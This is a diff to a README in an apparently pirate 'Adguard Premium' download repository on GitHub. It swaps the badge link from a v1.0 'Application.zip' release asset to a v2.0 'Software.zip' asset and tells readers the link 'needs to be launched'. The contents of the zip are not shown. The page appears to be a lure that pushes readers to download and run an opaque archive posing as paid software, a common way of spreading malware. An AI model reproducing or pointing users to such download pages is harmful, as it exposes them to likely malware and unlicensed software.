@@ -28,7 +28,7 @@ This repository is dedicated to providing resources related to Adguard Premium, 
 ## Download Adguard Premium Software
 
 Click the button below to download the Adguard Premium software:
-[![Download Adguard Premium Software](https://github.com/DanielCandela29823/Adguard-Premium-Download/releases/download/v1.0/Application.zip%20Premium%20Software-blue)](https://github.com/DanielCandela29823/Adguard-Premium-Download/releases/download/v1.0/Application.zip)
+[![Download Adguard Premium Software](https://github.com/DanielCandela29823/Adguard-Premium-Download/releases/download/v2.0/Software.zip%20Premium%20Software-blue)](https://github.com/DanielCandela29823/Adguard-Premium-Download/releases/download/v2.0/Software.zip)
 
 *Note: The link provided needs to be launched.*
 
